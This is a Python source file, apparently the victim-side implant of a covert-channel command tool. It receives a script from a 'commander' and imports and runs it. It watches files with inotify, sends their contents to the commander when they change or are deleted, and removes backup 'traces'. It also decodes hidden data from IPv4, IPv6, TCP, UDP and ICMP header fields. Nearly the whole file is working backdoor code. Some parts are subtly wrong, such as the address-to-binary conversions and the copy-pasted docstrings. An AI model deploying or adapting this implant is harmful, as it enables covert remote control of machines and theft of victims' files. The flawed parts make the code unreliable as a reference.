import getopt
import ipaddress
import os
import queue
import socket
import sys
import time
from scapy.layers.inet6 import IPv6
from scapy.sendrecv import send, sniff
import constants
import importlib
import inotify.adapters
from scapy.layers.inet import IP, TCP, UDP, ICMP


def parse_arguments():
    # Initialization
    print(constants.OPENING_BANNER)
    source_ip, source_port = "", ""

    # GetOpt Arguments
    arguments = sys.argv[1:]
    opts, user_list_args = getopt.getopt(arguments, 's:p:')

    if len(opts) == constants.ZERO:
        sys.exit(constants.NO_ARG_ERROR)

    for opt, argument in opts:
        if opt == '-s':  # For source IP
            try:
                if argument == constants.LOCAL_HOST:
                    argument = constants.LOCAL_HOST_VALUE
                source_ip = str(ipaddress.ip_address(argument))
            except ValueError as e:
                sys.exit(constants.INVALID_SRC_IP_ADDRESS_ARG_ERROR.format(e))

        if opt == '-p':  # For source port
            try:
                source_port = int(argument)
                if not (constants.MIN_PORT_RANGE < source_port < constants.MAX_PORT_RANGE):
                    sys.exit(constants.INVALID_SRC_PORT_NUMBER_RANGE)
            except ValueError as e:
                sys.exit(constants.INVALID_FORMAT_SRC_PORT_NUMBER_ARG_ERROR.format(e))

    # Check if IPs and Ports were specified
    if len(source_ip) == constants.ZERO:
        sys.exit(constants.NO_SRC_IP_ADDRESS_SPECIFIED_ERROR)

    if len(str(source_port)) == constants.ZERO:
        sys.exit(constants.NO_SRC_PORT_NUMBER_SPECIFIED_ERROR)

    return source_ip, source_port


def initialize_server_socket(source_ip: str, source_port: int):
    """
    Initializes the server socket.

    @param source_ip:
        A string containing the server's IP address

    @param source_port:
        An integer representing the server's port number

    @return: server_socket
        A socket with the binded information
    """
    try:
        # Create a socket object
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Define the server address and port
        server_address = (source_ip, source_port)

        # Bind the socket to the server address and port
        server_socket.bind(server_address)

        # Listen for incoming connections (maximum 5 clients in the queue)
        server_socket.listen(5)
        print(constants.SUCCESS_SOCKET_CREATE_MSG)
        print(constants.SOCKET_INFO_MSG.format(*server_address))

    except PermissionError as e:
        sys.exit(constants.VICTIM_SERVER_SOCKET_CREATION_ERROR_MSG.format(str(e)))

    return server_socket


def is_file_openable(file_path):
    try:
        with open(file_path, constants.READ_MODE) as file:
            pass
        return True
    except IOError as e:
        print(constants.FILE_CANNOT_OPEN_ERROR.format(file_path, e))
        return False


def is_importable(file_name: str):
    print(f"[+] Importing module {file_name}...")

    try:
        importlib.import_module(file_name)
        return True
    except ImportError as e:
        print(constants.FAILED_IMPORT_ERROR.format(file_name, e))
        return False
    except Exception as e:
        print(constants.FAILED_IMPORT_EXCEPTION_ERROR.format(file_name, e))
        return False


def delete_file(file_path: str):
    try:
        if os.path.exists(file_path):
            print(f"[+] OPERATION PENDING: Now deleting {file_path}...")
            os.remove(file_path)
            print(f"[+] OPERATION SUCCESS: {file_path} has been successfully deleted!")
        else:
            print(f"[+] NO ACTION REQUIRED: {file_path} does not exist!")
    except FileNotFoundError:
        print(f"[+] ERROR: The file '{file_path}' does not exist or cannot be deleted.")
    except Exception as e:
        print(f"[+] ERROR: An error occurred while deleting the file: {e}")


def watch_stop_signal(client_socket: socket.socket,
                      signal_queue: queue.Queue):
    while True:
        try:
            signal = client_socket.recv(100).decode()
            if signal == constants.STOP_KEYWORD:
                print(constants.CLIENT_RESPONSE.format(signal))
                signal_queue.put(signal)
                print(constants.WATCH_FILE_SIGNAL_THREAD_END)
                return None
        except socket.timeout as e:
            print("[+] ERROR: Connection to client has timed out : {}".format(e))
            client_socket.settimeout(None)
            return None
        except socket.error as e:
            print("[+] Socket error: {}".format(e))
            client_socket.settimeout(None)
            return None


def __copy_file(source_file_path: str, backup_file_path: str):
    try:
        with open(source_file_path, 'rb') as source:
            with open(backup_file_path, 'wb') as backup:
                while True:
                    chunk = source.read(1024)
                    if not chunk:
                        break
                    backup.write(chunk)
    except Exception as e:
        print(f"[+] COPY FILE TO BACKUP ERROR: An error occurred: {e}")


def create_backup_file(original_filename: str,
                       backup_filename: str,
                       modified_file_dict: dict):
    """
    Creates and replaces the current version of a backup file with a new one
    in the victim's current directory.

    @param original_filename:
            A string representing the original file name

    @param backup_filename:
            A string representing the backup file name

    @param modified_file_dict:
            A dictionary containing files marked with modified status

    @return: None
    """
    # 2) Create an initial backup if it doesn't exist
    if not os.path.exists(backup_filename):
        __copy_file(original_filename, backup_filename)
        print(constants.BACKUP_FILE_CREATED_MSG.format(original_filename, backup_filename))
        return None

    # 3) Check if the file is modified
    if modified_file_dict[original_filename]:  # If modified (true)...
        # a) Remove old backup
        if os.path.exists(backup_filename):
            os.remove(backup_filename)

        # b) Create a new version of backup
        __copy_file(original_filename, backup_filename)
        print(constants.BACKUP_FILE_CREATED_MSG.format(original_filename, backup_filename))

        # c) Remove modification mark
        modified_file_dict[original_filename] = False
    else:
        return None


def remove_file(file_path: str):
    if os.path.exists(file_path):
        os.remove(file_path)
        print("[+] FILE DELETION SUCCESSFUL: The following file has been deleted {}!".format(file_path))
    else:
        print("[+] ERROR: The following file does not exist: {}".format(file_path))


def watch_file(client_socket: socket.socket,
               file_path: str,
               signal_queue: queue.Queue):
    # Create an inotify object
    notifier = inotify.adapters.Inotify()
    print("[+] WATCHING FILE: Now watching the following file: {}".format(file_path))

    # Add the file to watch for modification and delete events
    notifier.add_watch(file_path)

    # Initialize a modified file dictionary to keep track of modified files
    modified_files_dict = {file_path: False}

    # Create Initial Backup Copy of Watch File
    backup_file_name = constants.BACKUP_MODIFIER + "_" + file_path.split("/")[-1]
    create_backup_file(file_path, backup_file_name, modified_files_dict)

    try:
        while True:
            # Wait for events
            for event in notifier.event_gen():
                # Check signal for stop before processing event
                if not signal_queue.empty() and signal_queue.get() == constants.STOP_KEYWORD:
                    notifier.remove_watch(file_path)
                    remove_file(backup_file_name)
                    return None

                if event is not None:
                    (header, type_names, watch_path, _) = event

                    # a) Create a backup (most present) copy for any event (in case of deletion)
                    backup_file_name = constants.BACKUP_MODIFIER + "_" + watch_path
                    create_backup_file(file_path, backup_file_name, modified_files_dict)

                    # c) If Modified -> Send events to Commander for modification
                    if "IN_MODIFY" in type_names:
                        print(constants.WATCH_FILE_MODIFIED.format(watch_path))
                        client_socket.send("IN_MODIFY".encode())

                        # i) Start file transfer
                        with open(file_path, 'rb') as file:
                            while True:
                                file_data = file.read(1024)
                                if not file_data:
                                    break
                                client_socket.send(file_data)

                        client_socket.send(constants.END_OF_FILE_SIGNAL)
                        print(constants.WATCH_FILE_TRANSFER_SUCCESS.format(file_path))

                        # ii) Mark file as modified
                        modified_files_dict[file_path] = True

                    # d) If Deleted -> Send events to notify commander that file has been deleted
                    if "IN_DELETE" in type_names or "IN_DELETE_SELF" in type_names:
                        print(constants.WATCH_FILE_DELETED.format(watch_path))
                        client_socket.send("IN_DELETE".encode())

                        # i) Get backup file path
                        backup_file_name = constants.BACKUP_MODIFIER + "_" + watch_path

                        # ii) Start file transfer
                        with open(backup_file_name, 'rb') as file:
                            while True:
                                file_data = file.read(1024)
                                if not file_data:
                                    break
                                client_socket.send(file_data)

                        client_socket.send(constants.END_OF_FILE_SIGNAL)
                        print(constants.WATCH_FILE_TRANSFER_SUCCESS.format(file_path))

                        # iii) Remove traces of backup
                        remove_file(backup_file_name)

                        # iv) Stop watching file and return to main()
                        print(constants.WATCH_FILE_DELETE_EVENT_END_MSG.format(watch_path))
                        return None

    # Handle Ctrl+C to exit the loop
    except KeyboardInterrupt:
        pass


def __bin_to_bytes(binary_string):
    return bytes(int(binary_string[i:i + 8], 2) for i in range(0, len(binary_string), 8))


def covert_data_write_to_file(covert_data: str, filename: str):
    """
    Creates a file (if does not exist) and writes binary data to the file.
    In addition, it decrypts the data beforehand.

    @param covert_data:
        A string containing binary data

    @param filename:
        A string containing the file name

    @return: None
    """
    if covert_data:
        data = (__bin_to_bytes(covert_data)
                .replace(constants.NULL_BYTE, b'')
                .replace(constants.STX_BYTE, b''))

        with open(filename, constants.WRITE_BINARY_MODE) as f:
            f.write(data)


def get_packet_count(client_socket: socket):
    """
    Returns the total number of packets from commander for
    accurate Scapy sniff functionality.

    @param client_socket:
        The client socket

    @return: count
        An integer containing the total number of packets
        to be received
    """
    count = int(client_socket.recv(1024).decode())
    print(constants.CLIENT_RESPONSE.format(constants.CLIENT_TOTAL_PACKET_COUNT_MSG.format(count)))
    return count


def __bytes_to_bin(data):
    return ''.join(format(byte, constants.BINARY_MODE) for byte in data)


# ===================== IPV4 EXTRACT COVERT DATA FUNCTIONS =====================


def extract_data_ipv4_ttl(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified ttl field.

    @note Bit length
        The version field for IPv4 headers is 8 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from ttl field
    """
    if packet.haslayer('IP'):
        covert_data = packet[IP].ttl
        binary_data = format(covert_data, constants.EIGHT_BIT)  # Adjust to 8 bits for each character
        return binary_data


def extract_data_ipv4_version(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified version field.

    @note Bit length
        The version field for IPv4 headers is 4 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from version field
    """
    if packet.haslayer('IP'):
        covert_data = packet[IP].version
        binary_data = format(covert_data, constants.FOUR_BIT)  # Adjust to 4 bits for each character
        return binary_data


def extract_data_ipv4_ihl(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified IHL field.

    @note Bit length
        The IHL field for IPv4 headers is 4 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from IHL field
    """
    if packet.haslayer('IP'):
        covert_data = packet[IP].ihl
        binary_data = format(covert_data, constants.FOUR_BIT)  # Adjust to 4 bits for each character
        return binary_data


def extract_data_ipv4_ds(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified DS (differentiated services) field.

    @note Bit length
        The DS field for IPv4 headers is 6 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        covert_data = (packet[IP].tos >> 2) & 0b111111  # Get the first six bits of TOS (starting from most sig. bit)
        binary_data = format(covert_data, constants.SIX_BIT)  # Adjust to 6 bits for each character
        return binary_data


def extract_data_ipv4_ecn(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified ECN field.

    @note Bit length
        The ECN field for IPv4 headers is 2 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        covert_data = (packet[IP].tos & 0b11)  # Get the last two bits of TOS (starting from least sig. bit)
        binary_data = format(covert_data, constants.TWO_BIT)
        return binary_data


def extract_data_ipv4_total_length(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified total length field.

    @note Bit length
        The total length field for IPv4 headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        covert_data = packet[IP].len
        binary_data = format(covert_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_ipv4_identification(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified identification field.

    @note Bit length
        The identification field for IPv4 headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        covert_data = packet[IP].id
        binary_data = format(covert_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_ipv4_flags(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified flags field.

    @note Bit length
        The flags field for IPv4 headers is 3 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        covert_data = int(packet[IP].flags)
        binary_data = format(covert_data, constants.THREE_BIT)
        return binary_data


def extract_data_ipv4_frag_offset(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified fragment offset field.

    @note Bit length
        The fragment offset field for IPv4 headers is 13 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        covert_data = packet[IP].frag
        binary_data = format(covert_data, constants.THIRTEEN_BIT)
        return binary_data


def extract_data_ipv4_protocol(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified protocol field.

    @note Bit length
        The protocol field for IPv4 headers is 8 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        covert_data = packet[IP].proto
        binary_data = format(covert_data, constants.EIGHT_BIT)
        return binary_data


def extract_data_ipv4_header_chksum(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified header checksum field.

    @note Bit length
        The header checksum field for IPv4 headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        covert_data = packet[IP].chksum
        binary_data = format(covert_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_ipv4_src_addr(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified source address field.

    @note Bit length
        The source address field for IPv4 headers is 32 bits (4 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        # a) Initialize Variable
        binary_data = ""

        # b) Get covert data from the packet
        covert_data = packet[IP].src

        # c) Get each octet and place in variable
        ip_octets = covert_data.split('.')  # IP Octet format: XXXX.XXXX.XXXX.XXXX
        for octet in ip_octets:
            binary_data += format(int(octet), constants.THIRTY_TWO_BIT)

        return binary_data


def extract_data_ipv4_dst_addr(packet):
    """
    A handler function to extract data from packets with IPv4
    header and a modified source address field.

    @attention Functionality Disabled
        This is not used

    @note Bit length
        The source address field for IPv4 headers is 32 bits (4 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if packet.haslayer('IP'):
        # a) Initialize Variable
        binary_data = ""

        # b) Get covert data from the packet
        covert_data = packet[IP].dst

        # c) Get each octet and place in variable
        ip_octets = covert_data.split('.')  # IP Octet format: XXXX.XXXX.XXXX.XXXX
        for octet in ip_octets:
            binary_data += format(int(octet), constants.EIGHT_BIT)

        return binary_data


# ===================== IPV6 EXTRACT COVERT DATA FUNCTIONS =====================


def __is_valid_ipv6(address: str):
    try:
        ipaddress.IPv6Address(address)
        return True
    except ipaddress.AddressValueError as e:
        print(constants.INVALID_IPV6_ERROR.format(e))
        return False


def receive_get_ipv6_script(client_socket: socket.socket, client_ip: str, client_port: int):
    """
    Get ipv6_getter.py from commander, executes the script and sends over
    IPv6 address and port.

    @param client_socket:
        The commander socket

    @param client_ip:
        A string containing the commander's IP address

    @param client_port:
        A string containing the commander's port number

    @return: ipv6, port
        A tuple containing the IPv6 address and port number
        of the executing host machine
    """
    # Get the file name from Commander
    res = client_socket.recv(1024).decode().split("/")
    file_path = res[0]
    file_name = file_path.split(".")[0]  # => Must be without .py extension for importing
    cmdr_ipv6_addr = res[1]

    # Receive File if exists (MUST DO: put in downloads/[client_ip])
    with open(file_path, "wb") as file:
        eof_marker = constants.FILE_END_OF_FILE_SIGNAL  # Define the end-of-file marker

        while True:
            file_data = client_socket.recv(1024)
            if not file_data:
                break  # No more data received
            if file_data.endswith(eof_marker):
                file.write(file_data[:-len(eof_marker)])  # Exclude the end-of-file marker
                break
            else:
                file.write(file_data)

    # Perform Import and Run Function to get IPv6
    if is_file_openable(file_path):
        print(constants.TRANSFER_SUCCESS_MSG.format(file_path))

        # Import module and get IPv6 address
        if is_importable(file_name):
            get_ipv6 = importlib.import_module(file_name)
            ipv6, port = get_ipv6.determine_ipv6_address()  # Run function inside script

            if __is_valid_ipv6(ipv6):
                print(constants.IPV6_FOUND_MSG.format(ipv6))
                client_socket.send((constants.VICTIM_ACK + "/" + ipv6 + "/" + str(port)).encode())  # Transfer Result
                os.remove(file_path)
                return ipv6, port, cmdr_ipv6_addr
            else:
                print(constants.IPV6_OPERATION_ERROR)
                client_socket.send(constants.IPV6_ERROR_MSG_TO_CMDR.encode())
                os.remove(file_path)
                return None, None, None
        else:
            client_socket.send(constants.IMPORT_IPV6_SCRIPT_ERROR.format(file_path).encode())
            os.remove(file_path)
            return None, None, None
    else:
        client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
        os.remove(file_path)
        return None, None, None


def extract_data_ipv6_version(packet):
    """
    A handler function to extract data from packets with IPv6
    header and a modified version field.

    @note Bit length
        The version field for IPv6 headers is 4 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IPv6 in packet:
        version = packet[IPv6].version
        binary_data = format(version, constants.FOUR_BIT)
        return binary_data


def extract_data_ipv6_traffic_class(packet):
    """
    A handler function to extract data from packets with IPv6
    header and a modified traffic class field.

    @note Bit length
        The traffic class field for IPv6 headers is 8 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IPv6 in packet:
        traffic_class_data = packet[IPv6].tc
        binary_data = format(traffic_class_data, constants.EIGHT_BIT)
        return binary_data


def extract_data_ipv6_flow_label(packet):
    """
    A handler function to extract data from packets with IPv6
    header and a modified flow label field.

    @note Bit length
        The flow label field for IPv6 headers is 20 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IPv6 in packet:
        flow_label_data = packet[IPv6].fl
        binary_data = format(flow_label_data, constants.TWENTY_BIT)
        return binary_data


def extract_data_ipv6_payload_length(packet):
    """
    A handler function to extract data from packets with IPv6
    header and a modified payload length field.

    @note Bit length
        The payload length field for IPv6 headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IPv6 in packet:
        payload_length_data = packet[IPv6].plen
        binary_data = format(payload_length_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_ipv6_next_header(packet):
    """
    A handler function to extract data from packets with IPv6
    header and a modified next header field.

    @note Bit length
        The next header field for IPv6 headers is 8 bits (1 byte)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IPv6 in packet:
        next_header_data = packet[IPv6].nh
        binary_data = format(next_header_data, constants.EIGHT_BIT)
        return binary_data


def extract_data_ipv6_hop_limit(packet):
    """
    A handler function to extract data from packets with IPv6
    header and a modified hop limit field.

    @note Bit length
        The hop limit field for IPv6 headers is 8 bits (1 byte)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IPv6 in packet:
        hop_limit_data = packet[IPv6].hlim
        binary_data = format(hop_limit_data, constants.EIGHT_BIT)
        return binary_data


def extract_data_ipv6_src_addr(packet):
    """
    A handler function to extract data from packets with IPv6
    header and a modified source address field.

    @note Bit length
        The source address field for IPv6 headers is 128 bits (12 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IPv6 in packet:
        source_address = packet[IPv6].src
        binary_data = ''.join(format(int(byte, 16), '08b') for byte in source_address.replace(':', ''))
        return binary_data


def extract_data_ipv6_dst_addr(packet):
    """
    A handler function to extract data from packets with IPv6
    header and a modified destination address field.

    @attention FUNCTIONALITY DISABLED
        This is not used

    @note Bit length
        The source address field for IPv6 headers is 128 bits (12 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    return None


# ===================== TCP EXTRACT COVERT DATA FUNCTIONS =====================


def extract_data_tcp_src_port(packet):
    """
    A handler function to extract data from packets with TCP
    header and a modified source port field.

    @note Bit length
        The source port field for IPv6 headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and TCP in packet:
        src_port_data = packet[TCP].sport
        binary_data = format(src_port_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_tcp_dst_port(packet):
    """
    A handler function to extract data from packets with TCP
    header and a modified destination port field.

    @note Bit length
        The destination port field for IPv6 headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and TCP in packet:
        dst_port_data = packet[TCP].dport
        binary_data = format(dst_port_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_tcp_seq_num(packet):
    """
    A handler function to extract data from packets with TCP
    header and a modified sequence number field.

    @note Bit length
        The sequence number field for IPv6 headers is 32 bits (4 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and TCP in packet:
        seq_num_data = packet[TCP].seq
        binary_data = format(seq_num_data, constants.THIRTY_TWO_BIT)
        return binary_data


def extract_data_tcp_ack_num(packet):
    """
    A handler function to extract data from packets with TCP
    header and a modified acknowledgement number field.

    @note Bit length
        The acknowledgement number field for IPv6 headers is 32 bits (4 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and TCP in packet:
        ack_num_data = packet[TCP].ack
        binary_data = format(ack_num_data, constants.THIRTY_TWO_BIT)
        return binary_data


def extract_data_tcp_data_offset(packet):
    """
    A handler function to extract data from packets with TCP
    header and a modified data offset field.

    @note Bit length
        The data offset field for IPv6 headers is 4 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and TCP in packet:
        data_offset_data = packet[TCP].dataofs
        binary_data = format(data_offset_data, constants.FOUR_BIT)
        return binary_data


def extract_data_tcp_reserved(packet):
    """
    A handler function to extract data from packets with TCP
    header and a modified reserved field.

    @note Bit length
        The reserved field for IPv6 headers is 3 bits

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and TCP in packet:
        reserved_data = packet[TCP].reserved
        binary_data = format(reserved_data, constants.THREE_BIT)
        return binary_data


def extract_data_tcp_flags(packet):
    """
    A handler function to extract data from packets with TCP
    header and several modified flag fields.

    @note Bit length
        The flags field for TCP headers is 9 bits for the different
        flags (ECN, ACK, SYN, FIN, etc.)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and TCP in packet:
        flag_data = int(packet[TCP].flags)
        binary_data = format(flag_data, constants.NINE_BIT)
        return binary_data


def extract_data_tcp_window_size(packet):
    """
    A handler function to extract data from packets with TCP
    header and window size field.

    @note Bit length
        The window field for TCP headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and TCP in packet:
        window_data = packet[TCP].window
        binary_data = format(window_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_tcp_chksum(packet):
    """
    A handler function to extract data from packets with TCP
    header and checksum field.

    @note Bit length
        The checksum field for TCP headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and TCP in packet:
        chksum_data = packet[TCP].chksum
        binary_data = format(chksum_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_tcp_urgent_ptr(packet):
    """
    A handler function to extract data from packets with TCP
    header and urgent pointer field.

    @note Bit length
        The urgent pointer field for TCP headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and TCP in packet:
        urg_ptr_data = packet[TCP].urgptr
        binary_data = format(urg_ptr_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_tcp_options(packet):
    """
    A handler function to extract data from packets with TCP
    header and TimeStamp options field.

    @note Bit length
        The options field for TCP headers is maximum 320 bits (40 bytes)
        16 bits chosen here for TimeStamp option

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and TCP in packet:
        timestamp_option = packet[TCP].options[0][1][0]
        binary_data = format(timestamp_option, constants.SIXTEEN_BIT)
        return binary_data


# ===================== UDP EXTRACT COVERT DATA FUNCTIONS =====================


def extract_data_udp_src_port(packet):
    """
    A handler function to extract data from packets with UDP
    header and a modified source port field.

    @note Bit length
        The source port field for UDP headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and UDP in packet:
        src_port_data = packet[UDP].sport
        binary_data = format(src_port_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_udp_dst_port(packet):
    """
    A handler function to extract data from packets with UDP
    header and a modified destination port field.

    @note Bit length
        The destination port field for UDP headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and UDP in packet:
        dst_port_data = packet[UDP].dport
        binary_data = format(dst_port_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_udp_length(packet):
    """
    A handler function to extract data from packets with UDP
    header and a modified length field.

    @note Bit length
        The length field for UDP headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and UDP in packet:
        length_data = packet[UDP].len
        binary_data = format(length_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_udp_chksum(packet):
    """
    A handler function to extract data from packets with UDP
    header and a modified checksum field.

    @note Bit length
        The checksum field for UDP headers is 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and UDP in packet:
        chksum_data = packet[UDP].chksum
        binary_data = format(chksum_data, constants.SIXTEEN_BIT)
        return binary_data


# ===================== ICMP EXTRACT COVERT DATA FUNCTIONS =====================


def extract_data_icmp_type(packet):
    """
    A handler function to extract data from packets with ICMP
    header and a modified type field.

    @note Bit length
        The type field for ICMP headers is maximum 8 bits (1 byte)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and ICMP in packet:
        type_data = packet[ICMP].type
        binary_data = format(type_data, constants.EIGHT_BIT)
        return binary_data


def extract_data_icmp_code(packet):
    """
    A handler function to extract data from packets with ICMP
    header and a modified code field.

    @note Bit length
        The code field for ICMP headers is maximum 8 bits (1 byte)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and ICMP in packet:
        code_data = packet[ICMP].code
        binary_data = format(code_data, constants.EIGHT_BIT)
        return binary_data


def extract_data_icmp_chksum(packet):
    """
    A handler function to extract data from packets with ICMP
    header and a modified checksum field.

    @note Bit length
        The checksum field for ICMP headers is maximum 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and ICMP in packet:
        chksum_data = packet[ICMP].chksum
        binary_data = format(chksum_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_icmp_identification(packet):
    """
    A handler function to extract data from packets with ICMP
    header and a modified identification field.

    @note Bit length
        The identification field for ICMP headers is maximum 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and ICMP in packet:
        id_data = packet[ICMP].id
        binary_data = format(id_data, constants.SIXTEEN_BIT)
        return binary_data


def extract_data_icmp_seq_num(packet):
    """
    A handler function to extract data from packets with ICMP
    header and a modified sequence number field.

    @note Bit length
        The sequence number field for ICMP headers is maximum 16 bits (2 bytes)

    @param packet:
        The received packet

    @return binary_data:
        A string containing binary data from DS field
    """
    if IP in packet and ICMP in packet:
        seq_num_data = packet[ICMP].seq
        binary_data = format(seq_num_data, constants.SIXTEEN_BIT)
        return binary_data


def get_protocol_header_function_extract_map():
    return {  # A tuple of [Header, Field] => Function
        # a) IPv4 Handlers
        ("IPv4", "Version"): extract_data_ipv4_version,
        ("IPv4", "IHL (Internet Header Length)"): extract_data_ipv4_ihl,
        ("IPv4", "DS (Differentiated Services Codepoint)"): extract_data_ipv4_ds,
        ("IPv4", "Explicit Congestion Notification (ECN)"): extract_data_ipv4_ecn,
        ("IPv4", "Total Length"): extract_data_ipv4_total_length,
        ("IPv4", "Identification"): extract_data_ipv4_identification,
        ("IPv4", "Flags"): extract_data_ipv4_flags,
        ("IPv4", "Fragment Offset"): extract_data_ipv4_frag_offset,
        ("IPv4", "TTL (Time to Live)"): extract_data_ipv4_ttl,
        ("IPv4", "Protocol"): extract_data_ipv4_protocol,
        ("IPv4", "Header Checksum"): extract_data_ipv4_header_chksum,
        ("IPv4", "Source Address"): extract_data_ipv4_src_addr,
        ("IPv4", "Destination Address"): extract_data_ipv4_dst_addr,

        # b) IPv6 Handlers
        ("IPv6", "Version"): extract_data_ipv6_version,
        ("IPv6", "Traffic Class"): extract_data_ipv6_traffic_class,
        ("IPv6", "Flow Label"): extract_data_ipv6_flow_label,
        ("IPv6", "Payload Length"): extract_data_ipv6_payload_length,
        ("IPv6", "Next Header"): extract_data_ipv6_next_header,
        ("IPv6", "Hop Limit"): extract_data_ipv6_hop_limit,
        ("IPv6", "Source Address"): extract_data_ipv6_src_addr,
        ("IPv6", "Destination Address"): extract_data_ipv6_dst_addr,

        # c) TCP Handlers
        ("TCP", "Source Port"): extract_data_tcp_src_port,
        ("TCP", "Destination Port"): extract_data_tcp_dst_port,
        ("TCP", "Sequence Number"): extract_data_tcp_seq_num,
        ("TCP", "Acknowledgement Number"): extract_data_tcp_ack_num,
        ("TCP", "Data Offset"): extract_data_tcp_data_offset,
        ("TCP", "Reserved"): extract_data_tcp_reserved,
        ("TCP", "Flags"): extract_data_tcp_flags,
        ("TCP", "Window Size"): extract_data_tcp_window_size,
        ("TCP", "Checksum"): extract_data_tcp_chksum,
        ("TCP", "Urgent Pointer"): extract_data_tcp_urgent_ptr,
        ("TCP", "Options"): extract_data_tcp_options,

        # d) UDP Handlers
        ("UDP", "Source Port"): extract_data_udp_src_port,
        ("UDP", "Destination Port"): extract_data_udp_dst_port,
        ("UDP", "Length"): extract_data_udp_length,
        ("UDP", "Checksum"): extract_data_udp_chksum,

        # e) ICMP Handlers
        ("ICMP", "Type (Type of Message)"): extract_data_icmp_type,
        ("ICMP", "Code"): extract_data_icmp_code,
        ("ICMP", "Checksum"): extract_data_icmp_chksum,
        ("ICMP", "Identifier"): extract_data_icmp_identification,
        ("ICMP", "Sequence Number"): extract_data_icmp_seq_num,
    }


